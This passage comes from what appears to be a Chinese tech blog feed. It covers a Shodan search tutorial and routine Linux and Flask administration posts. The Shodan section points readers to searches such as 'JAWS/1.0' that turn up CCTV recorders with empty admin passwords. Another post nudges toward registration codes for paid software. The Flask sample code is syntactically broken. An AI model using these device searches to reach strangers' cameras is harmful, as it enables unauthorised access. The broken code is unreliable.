alt="20180228192126597"></p><p>注册好之后就可以使用注册的账户进行登录并且开始使用了。</p><p>Shodan的使用方法较为简单，你可以将其当成一个网络区域的浏览器，之所以这样说是因为它具备搜索引擎的功能，而且是主要面对于网络设备的。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20180228195500346.png" alt="20180228195500346"></p><h4 id="条目介绍"><a href="#条目介绍" class="headerlink" title="条目介绍"></a>条目介绍</h4><p>左侧部分：</p><blockquote><p>Top Countries                             使用最多的国家<br>Top services                              使用最多的服务<br>Top organizations                         使用最多的组织<br>Top operating systems                     使用最多的操作系统<br>Top products (Software name)              使用最多的产品</p></blockquote><p>中间部分：</p><p>涉及与搜素关键词有关的Target，主要包含的信息有：</p><blockquote><p>IP地址<br>主机名<br>该主机所处国家、区域<br>该条目的收录收录时间<br>Banner信息</p></blockquote><p>如果想要获得更加详细的信息可以点击“Details”之后获取与此目标相关的信息内容：</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20180228200653168.png" alt="20180228200653168"></p><p>可以看到左侧有明确的信息，上方有该主机所处的地理位置视图，右侧有该主机开启的服务端口好、开启的服务信息。</p><h4 id="搜索语法"><a href="#搜索语法" class="headerlink" title="搜索语法"></a>搜索语法</h4><p>面对大量的信息量，如果要获取我们想要的目标信息，那么就必须附加限制条件缩小范围是最后的结果更加精确，与Google一样Shodan也有相应的语言可以使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hostname——————————搜索指定的主机或域名，例如 hostname:baidu</span><br><span class="line">port——————————————搜索指定的端口或服务，例如 port:80</span><br><span class="line">country———————————搜索指定的国家，例如 country:US</span><br><span class="line">city——————————————搜索指定的城市，例如 city:Chengdu</span><br><span class="line">org———————————————搜索指定的组织或公司，例如 org:&quot;Google&quot;</span><br><span class="line">isp———————————————搜索指定的ISP供应商，例如 isp:&quot;China Telecom&quot;</span><br><span class="line">product———————————搜索指定的操作系统&#x2F;软件&#x2F;平台，例如 product:&quot;Apache httpd&quot;</span><br><span class="line">version———————————搜索指定的软件版本，例如 version:&quot;1.6.2&quot;</span><br><span class="line">geo———————————————搜索指定的地理位置，参数为经纬度，例如 geo:&quot;31.8639, 117.2808&quot;</span><br><span class="line">before&#x2F;after——————搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:&quot;11-11-15&quot;</span><br><span class="line">net———————————————搜索指定的IP地址或子网，例如 net:&quot;210.45.240.0&#x2F;24&quot;</span><br></pre></td></tr></table></figure><p>搜索示例：</p><p>查找位于国内的Nginx服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx country:&quot;CN&quot;</span><br></pre></td></tr></table></figure><p>查找 GWS(Google Web Server) 服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Server: gws&quot; hostname:&quot;google&quot;</span><br></pre></td></tr></table></figure><p>查找指定网段的华为设备：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">huawei net:&quot;61.191.146.0&#x2F;24&quot;</span><br></pre></td></tr></table></figure><p>查找CCTV网络摄像头</p><p>CCTV(Mvpower 8 Channel Security DVR Full D1 H.264CCTV Real-time Network Digital Video Recorder Mobile Motion Detection,P2P HDMIAlarm Email for CCTV Surveillance Cmeras System)存在弱口令admin密码为空。搜索JAWS/1.0，发现很多login都存在弱口令漏洞。</p><h3 id="命令行版shodan"><a href="#命令行版shodan" class="headerlink" title="命令行版shodan"></a>命令行版shodan</h3><p>Shodan 是由官方提供的 Python 库的，项目位于：<a href="https://github.com/achillean/shodan-python">https://github.com/achillean/shodan-python</a></p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install shodan</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;achillean&#x2F;shodan-python.git &amp;&amp; cd shodan-python</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><h4 id="查看帮助"><a href="#查看帮助" class="headerlink" title="查看帮助"></a>查看帮助</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">shodan -h</span><br><span class="line"></span><br><span class="line">Usage: shodan [OPTIONS] COMMAND [ARGS]...</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, --help  Show this message and exit.</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  alert       Manage the network alerts for your account</span><br><span class="line">  convert     Convert the given input data file into a different format.</span><br><span class="line">  count       Returns the number of results for a search</span><br><span class="line">  data        Bulk data access to Shodan</span><br><span class="line">  domain      View all available information for a domain</span><br><span class="line">  download    Download search results and save them in a compressed JSON...</span><br><span class="line">  honeyscore  Check whether the IP is a honeypot or not.</span><br><span class="line">  host        View all available information for an IP address</span><br><span class="line">  info        Shows general information about your account</span><br><span class="line">  init        Initialize the Shodan command-line</span><br><span class="line">  myip        Print your external IP address</span><br><span class="line">  org         Manage your organization&#39;s access to Shodan</span><br><span class="line">  parse       Extract information out of compressed JSON files.</span><br><span class="line">  radar       Real-Time Map of some results as Shodan finds them.</span><br><span class="line">  scan        Scan an IP&#x2F; netblock using Shodan.</span><br><span class="line">  search      Search the Shodan database</span><br><span class="line">  stats       Provide summary information about a search query</span><br><span class="line">  stream      Stream data in real-time.</span><br><span class="line">  version     Print version of this tool.</span><br></pre></td></tr></table></figure><h4 id="初始化命令行工具"><a href="#初始化命令行工具" class="headerlink" title="初始化命令行工具"></a>初始化命令行工具</h4><p>API_Key注册后在自己的账户中可以看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shodan init [API_Key]</span><br></pre></td></tr></table></figure><h4 id="常用示例"><a href="#常用示例" class="headerlink" title="常用示例"></a>常用示例</h4><p>（1）查询结果数量 count</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shodan count microsoft iis 6.0</span><br></pre></td></tr></table></figure><p>（2）将搜索结果下载到文件 download</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shodan download microsoft-data microsoft iis 6.0</span><br></pre></td></tr></table></figure><p>文件中的每一行都是 JSON 格式存储的目标 banner 信息。默认情况下，该命令只会下载100条结果（未付费只能获得100个搜索结果）。</p><p>（3）解析下载数据 parse</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shodan parse --fields ip_str,port,org --separator , microsoft-data.json.gz</span><br></pre></td></tr></table></figure><p>可以使用 parse 来解析之前下载数据，它可以帮助我们过滤出自己感兴趣的内容，也可以用来将下载的数据格式从 JSON 转换成 CSV 等等其他格式，当然更可以用作传递给其他处理脚本的管道。将上面下载的数据以CSV格式输出IP地址、端口号和组织名称，显示如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">211.105.106.75,80,Korea Telecom</span><br><span class="line">62.99.86.180,80,Euskaltel S.A.</span><br><span class="line">154.211.198.126,80,Colleagues Technology CO. ,LIMITED</span><br><span class="line">108.187.87.20,80,Leaseweb USA</span><br><span class="line">212.199.166.129,81,Partner Communications</span><br><span class="line">203.144.243.45,80,True Internet</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>（4）查看指定主机信息 host</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shodan host 84.111.180.75</span><br></pre></td></tr></table></figure><p>查看指定主机的相关信息，如地理位置信息，开放端口，甚至是否存在某些漏洞等信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Hostnames:               bzq-84-111-180-75.cablep.bezeqint.net;bzq-84-111-180-75.red.bezeqint.net</span><br><span class="line">City:                    Ramat Gan</span><br><span class="line">Country:                 Israel</span><br><span class="line">Organization:            Bezeq International</span><br><span class="line">Updated:                 2020-05-06T07:01:44.401906</span><br><span class="line">Number of open ports:    2</span><br><span class="line"></span><br><span class="line">Ports:</span><br><span class="line">     23&#x2F;tcp  </span><br><span class="line">  60001&#x2F;tcp  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>（5）查询结果直接展示在命令行 search</p><p>直接将查询结果展示在命令行中，默认情况下只显示IP、端口号、主机名和HTTP数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shodan search microsoft iis 6.0</span><br></pre></td></tr></table></figure><p>当然我们也可以通过使用 –fields 来自定义显示内容，例如，我们只显示IP、端口号、组织名称和主机名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0</span><br></pre></td></tr></table></figure><h4 id="代码中使用"><a href="#代码中使用" class="headerlink" title="代码中使用"></a>代码中使用</h4><p>利用 shodan 库，需要初始化连接 API，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import shodan</span><br><span class="line">SHODAN_API_KEY &#x3D; &quot;API_KEY&quot;</span><br><span class="line">api &#x3D; shodan.Shodan(SHODAN_API_KEY)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    # 搜索 Shodan</span><br><span class="line">    results_count &#x3D; api.count(&#39;apache&#39;)</span><br><span class="line">    results &#x3D; api.search(&#39;apache&#39;,page&#x3D;1, limit&#x3D;10)</span><br><span class="line">    # 显示结果</span><br><span class="line">    print(&#39;Results found: %s&#39; % results[&#39;total&#39;])</span><br><span class="line">    for result in results[&#39;matches&#39;]:</span><br><span class="line">        print(result[&#39;ip_str&#39;])</span><br><span class="line">except shodan.APIError as e:</span><br><span class="line">    print(&#39;Error: %s&#39; % e)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Results found: 17325205</span><br><span class="line">45.117.5.48</span><br><span class="line">162.241.95.203</span><br><span class="line">199.116.77.245</span><br><span class="line">200.46.179.108</span><br><span class="line">2001:638:502:390:20c:29ff:fe68:7f8</span><br><span class="line">195.30.97.214</span><br><span class="line">94.130.247.42</span><br><span class="line">18.217.192.143</span><br><span class="line">46.105.103.193</span><br><span class="line">194.67.141.5</span><br></pre></td></tr></table></figure><p>常用 Shodan 库函数</p><pre><code>shodan.Shodan(key) ：初始化连接APIShodan.count(query, facets=None)：返回查询结果数量Shodan.host(ip, history=False)：返回一个IP的详细信息Shodan.ports()：返回Shodan可查询的端口号Shodan.protocols()：返回Shodan可查询的协议Shodan.services()：返回Shodan可查询的服务Shodan.queries(page=1, sort=&#39;timestamp&#39;, order=&#39;desc&#39;)：查询其他用户分享的查询规则Shodan.scan(ips, force=False)：使用Shodan进行扫描，ips可以为字符或字典类型Shodan.search(query, page=1, limit=None, offset=None, facets=None, minify=True)：查询Shodan数据</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
            <tag> shodan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传到linux远程服务器scp</title>
      <link href="2020/04/29/2020-04-29-File_upload_to_Linux_remote_server_with_scp/"/>
      <url>2020/04/29/2020-04-29-File_upload_to_Linux_remote_server_with_scp/</url>
      
        <content type="html"><![CDATA[<h2 id="文件上传到linux远程服务器"><a href="#文件上传到linux远程服务器" class="headerlink" title="文件上传到linux远程服务器"></a>文件上传到linux远程服务器</h2><p>windows中可利用putty的pscp命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pscp 要上传的文件路径 服务器账号@服务器IP地址:要存放在服务器的位置路径</span><br></pre></td></tr></table></figure><p>或者图形界面WinSCP软件、XShell的Xftp软件</p><p>linux中利用scp命令：</p><p>上传本地文件到服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp &#x2F;path&#x2F;filename username@servername:&#x2F;path   </span><br></pre></td></tr></table></figure><p>从服务器上下载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp username@servername:&#x2F;path&#x2F;filename &#x2F;var&#x2F;www&#x2F;local_dir（本地目录）</span><br></pre></td></tr></table></figure><p>从服务器下载整个目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r username@servername:&#x2F;var&#x2F;www&#x2F;remote_dir&#x2F;（远程目录） &#x2F;var&#x2F;www&#x2F;local_dir（本地目录）</span><br></pre></td></tr></table></figure><p>上传目录到服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp  -r local_dir username@servername:remote_dir</span><br></pre></td></tr></table></figure><p>一般都是传输压缩包，所以需掌握一些基本压缩命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如：tar zxvf zhcon-0.2.5.tar.gz</span><br></pre></td></tr></table></figure><pre><code>分别是四个参数x : 从 tar 包中把文件提取出来         x：解压缩。c是压缩。z : 表示 tar 包是被 gzip 压缩过的，所以解压时需要用 gunzip 解压v : 显示详细信息f xxx.tar.gz :  指定被处理的文件是 xxx.tar.gz</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 修改时区和更新时间</title>
      <link href="2020/04/29/2020-04-29-ubuntu_modify_timezone_and_update_time/"/>
      <url>2020/04/29/2020-04-29-ubuntu_modify_timezone_and_update_time/</url>
      
        <content type="html"><![CDATA[<h1 id="Ubuntu修改时区和更新时间"><a href="#Ubuntu修改时区和更新时间" class="headerlink" title="Ubuntu修改时区和更新时间"></a>Ubuntu修改时区和更新时间</h1><p>18.04之后一条命令解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl set-timezone Asia&#x2F;Shanghai</span><br></pre></td></tr></table></figure><p>另一种方法比较复杂：</p><p>查看当前系统时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;# date -R   </span><br></pre></td></tr></table></figure><p>需要改成东八区，这儿显示不是，所以需要设置一个时区</p><p>1.运行tzselect</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;# tzselect</span><br></pre></td></tr></table></figure><p>在这里我们选择亚洲 Asia，确认之后选择中国（China)，最后选择北京(Beijing)</p><p>2.复制文件到/etc目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;# cp &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai  &#x2F;etc&#x2F;localtime</span><br></pre></td></tr></table></figure><p>3.再次查看时间date -R，已经修改为北京时间</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux远程管理工具PuTTY和SecureCRT</title>
      <link href="2020/04/29/2020-04-29-Linux_remote_management_tools_PuTTY_and_SecureCRT/"/>
      <url>2020/04/29/2020-04-29-Linux_remote_management_tools_PuTTY_and_SecureCRT/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux远程管理工具PuTTY和SecureCRT"><a href="#Linux远程管理工具PuTTY和SecureCRT" class="headerlink" title="Linux远程管理工具PuTTY和SecureCRT"></a>Linux远程管理工具PuTTY和SecureCRT</h2><p>Putty不支持自动登录linux，SecureCRT支持自动登录linux。这个区别显得Putty更安全，SecureCRT更方便。</p><p>Putty不支持同时登录多个linux，SecureCRT可以在每个tab page里面登录一个linux。</p><p>以上两个区别使得SecureCRT更适合系统管理员使用。</p><p>简单介绍下这两个软件：</p><h3 id="PuTTY远程管理工具"><a href="#PuTTY远程管理工具" class="headerlink" title="PuTTY远程管理工具"></a>PuTTY远程管理工具</h3><p>这是一款完全免费的 Windows 远程管理客户端工具，体积小，操作简单，不需要安装（下载后即可使用）。</p><p>对于经常到客户公司做技术支持和维护的朋友来说，该工具的使用相当方便，只要随身携带 U 盘，即可实现”一盘在手，随处登录”。</p><p>PuTTY 包含很多组件，比如说：</p><pre><code>PuTTY（远程登录的客户端）。PSCP（SCP 客户端，在命令行下通过 SSH 协议复制文件）。PSFTP（SFTP 的命令行客户端，类似于 FTP 的文件传输，基于 SSH 协议）。PuTTYtel（仅仅是一个 Telnet 客户端）。Plink（命令行工具，可用于执行远程M务器上的命令）。Pageant（PuTTY、PSCP、Plink 的 SSH 认证代理）。PuTTYgen（用来生成 RSA 和 DSA 密钥的工具）。</code></pre><p>尽管有如此多的组件，但对初学者来说，用的最多的主要是 PuTTY。</p><p>在“主机名称（或 IP 地址）”文本框中输入远程登录主机 IP 地址，如 192.168.8.88。</p><p>“端口”根据使用的协议有所区别（选择不同的“连接类型”选项，端口会自动变化），一般选择“SSH”或“Telnet”，这取决于 Linux 服务器所提供的服务。</p><p>建议选择 SSH，Telnet 服务密码会被明文传输，安全性较差，目前大多数 UNIX/Linux 系统默认禁用 Telent。</p><p>如果想保存会话方便下次连接，则可以在”保存的会话”文本框中输入一个名称，单击”保存”按钮即可把这次的连接配置保存起来。</p><h3 id="SecureCRT远程管理工具"><a href="#SecureCRT远程管理工具" class="headerlink" title="SecureCRT远程管理工具"></a>SecureCRT远程管理工具</h3><p>SecureCRT 是一款功能强大的远程管理工具，该软件将 SSH（Secure Shell）的安全登录、数据传送性能与 Windows 终端仿真提供的可靠注、可用性和可配置性融于一身。</p><p>使用此工具的优势是，管理多台服务器时可以很方便地记住多个地址，并且可以设置自动登录，方便远程管理，效率很高。但与 PuTTY 相比，SecureCRT 需要安装，并且是一款共享软件，不付费注册不能使用（网络上散布有一些注册码，读者可自行搜索使用）。</p><p>安装 SecureCRT 并启动后，单击”快速连接”按钮，输入 IP 地址和用户名，按照提示输入密码即可登录，与 PuTTy 类似。</p><p>除 PuTTY 和 SecureCRT 之外，还有一款笔者很喜欢用的 Windows 与 Linux 之间的文件共享工具 WinSCP，可以方便地实现两个系统之间的文件传输，有兴趣的读者也可以自行下载安装体验。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> putty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux压缩和解压缩命令</title>
      <link href="2020/04/29/2020-04-29-linux_compression_and_decompression_commands/"/>
      <url>2020/04/29/2020-04-29-linux_compression_and_decompression_commands/</url>
      
        <content type="html"><![CDATA[<h2 id="linux压缩和解压缩命令"><a href="#linux压缩和解压缩命令" class="headerlink" title="linux压缩和解压缩命令"></a>linux压缩和解压缩命令</h2><p>Linux 下的解压命令</p><p>c-创建-create</p><p>v-复杂输出</p><p>f-文件-file</p><p>x-解压-extract</p><p>z-gz格式</p><p>tar命令</p><p>　　解包：tar zxvf FileName.tar</p><p>　　打包：tar czvf FileName.tar DirName</p><p>gz命令</p><p>　　解压1：gunzip FileName.gz</p><p>　　解压2：gzip -d FileName.gz</p><p>　　压缩：gzip FileName</p><p>.tar.gz 和 .tgz</p><p>　　解压：tar zxvf FileName.tar.gz</p><p>　　压缩：tar zcvf FileName.tar.gz DirName</p><p>   压缩多个文件：tar zcvf FileName.tar.gz DirName1 DirName2 DirName3 …</p><p>bz2命令</p><p>　　解压1：bzip2 -d FileName.bz2</p><p>　　解压2：bunzip2 FileName.bz2</p><p>　　压缩： bzip2 -z FileName</p><p>.tar.bz2</p><p>　　解压：tar jxvf FileName.tar.bz2</p><p>　　压缩：tar jcvf FileName.tar.bz2 DirName</p><p>bz命令</p><p>　　解压1：bzip2 -d FileName.bz</p><p>　　解压2：bunzip2 FileName.bz</p><p>　　压缩：未知</p><p>.tar.bz</p><p>　　解压：tar jxvf FileName.tar.bz</p><p>Z命令</p><p>　　解压：uncompress FileName.Z</p><p>　　压缩：compress FileName</p><p>.tar.Z</p><p>　　解压：tar Zxvf FileName.tar.Z</p><p>　　压缩：tar Zcvf FileName.tar.Z DirName</p><p>zip命令</p><p>　　解压：unzip FileName.zip</p><p>　　压缩：zip FileName.zip DirName</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 压缩 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu server 18.04 运行 flask</title>
      <link href="2020/04/29/2020-04-29-ubuntu_server_18_04_run_flask/"/>
      <url>2020/04/29/2020-04-29-ubuntu_server_18_04_run_flask/</url>
      
        <content type="html"><![CDATA[<h2 id="ubuntu-server-18-04-运行-flask"><a href="#ubuntu-server-18-04-运行-flask" class="headerlink" title="ubuntu server 18.04 运行 flask"></a>ubuntu server 18.04 运行 flask</h2><p>1.安装ubuntu server 18.04</p><p>(1)换源:我自己换成了阿里源，换完之后记得更新</p><p>(2)安装python3 pip3 以及nginx,mysql</p><p>python3一般都自带了</p><p>其他的sudo apt-get install python3-pip nginx mysql-server</p><p>PS：如果flask需要数据库则安装，不需要跳过</p><p>mysql需要配置，可自行百度或者查看之前的文章</p><p>《Ubuntu18.04 安装MySQL》</p><p>《Mysql 只能sudo连接的问题》</p><p>2.利用xshell的xftp传输文件</p><p>主要是flask web程序/数据库sql</p><p>3.导入数据库</p><p>4.配置flaskweb所需包，uwsgi，nginx</p><p>将nginx配置写入/etc/nginx/nginx.conf</p><p>将uwsgi启动命令写入shell脚本，chmod赋予权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source &#x2F;home&#x2F;flaskweb&#x2F;venv&#x2F;bin&#x2F;activate</span><br><span class="line">nohup uwsgi --ini &#x2F;home&#x2F;flaskweb&#x2F;news_nginx_uwsgi&#x2F;uwsgi.ini &amp;</span><br></pre></td></tr></table></figure><p>放置在 /etc/profile.d/ 开机自启动</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Flask_uwsgi_Nginx部署Flask正式环境</title>
      <link href="2020/04/28/2020-04-28-Use_Flask_uwsgi_Nginx_to_deploy_Flask_official_environment/"/>
      <url>2020/04/28/2020-04-28-Use_Flask_uwsgi_Nginx_to_deploy_Flask_official_environment/</url>
      
        <content type="html"><![CDATA[<h2 id="使用Flask-uwsgi-Nginx部署Flask正式环境"><a href="#使用Flask-uwsgi-Nginx部署Flask正式环境" class="headerlink" title="使用Flask+uwsgi+Nginx部署Flask正式环境"></a>使用Flask+uwsgi+Nginx部署Flask正式环境</h2><p>因为Flask比较容易上手，之前也拿flask写过几个小项目，不过当时天真地以为只要在服务器上跑一个python脚本就算是成功发布了这个flask项目。实际上这还面临很多问题，比如并发性不好，不支持异步（虽然也可以在run里面加上threaded之类的参数来解决，但终究不是正途）等等。真正通用的做法应该是用某些web容器来启动项目。</p><p>Flask自带的web server的目的就是用于开发，而不是生产环境。他本身是web framework而不是web server. 自带的server应该只能开单进程。wsgi服务器都是专门为生产环境开发的,能配置更多从而处理更复杂的请求状况，从性能、稳定性、安全性来说，都更好。</p><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>本文主要讲解使用Flask+uwsgi+Nginx部署Flask正式环境，首先看一下用户通过浏览器访问网站的页面信息，经过了哪些？</p><p>flask与http没有协议，不可以与nginx直接沟通，需要uwsgi，wsgi可以与flask通过web协议沟通，也可以与nginx沟通；当用户访问url时，通过函数返回结果给wsgi，wsgi再给nginx。</p><p>过程如图：</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200305115956472.png"></p><ul><li>Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供IMAP / POP3 / SMTP服务。接收的请求量大，10K。</li><li>uWSGI是一个Web服务器，它实现了WSGI协议、uwsgi、http等协议。http协议和nginx进行交流，WSGI协议和后端的python代码，wed框架进行交流。</li><li>Framework即架构，它是一个语言开发软件，提供了软件开发的框架，使开发更具工程性、简便性和稳定性。常用的就是django和falsk框架，falsk用于小项目，django用于大项目。</li></ul><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>在开始正式讲解之前，我们将首先进行环境准备。</p><p>Step1：安装Python，pip以及nginx：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install python-pip python-dev nginx</span><br></pre></td></tr></table></figure><p>Step2：安装Python库：uwsgi和flask</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install uwsgi flask</span><br></pre></td></tr></table></figure><h3 id="创建Flask项目"><a href="#创建Flask项目" class="headerlink" title="创建Flask项目"></a>创建Flask项目</h3><p>下面，我们以一个简单的单文件Flask项目为例： </p><p>假设项目目录为/home/flask_project。 </p><p>编辑/home/flask_project/run.py：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line">@app.route(&quot;&#x2F;&quot;)</span><br><span class="line"></span><br><span class="line">def hello():</span><br><span class="line">return &quot;&lt;h1 style&#x3D;&quot;color:blue&quot;&gt;Hello There!&lt;&#x2F;h1&gt;&quot;</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">app.run(host&#x3D;&#39;0.0.0.0&#39;)</span><br></pre></td></tr></table></figure><p>运行 python run.py ，然后本地访问 <a href="http://127.0.0.1:5000/">http://127.0.0.1:5000</a> 将会看到：</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200429003337.png" alt="image-20200428170754810"></p><p>当然直接使用python run.py运行服务的方式只适合本地开发。线上运行时要保证更高的性能和稳定性，我们需要使用uwsgi进行部署。</p><h3 id="使用uwsgi部署Flask项目"><a href="#使用uwsgi部署Flask项目" class="headerlink" title="使用uwsgi部署Flask项目"></a>使用uwsgi部署Flask项目</h3><p>使用uwsgi部署Flask项目只需要换一种命令来启动服务即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uwsgi --socket 0.0.0.0:5000 --protocol&#x3D;http -p 3 -w 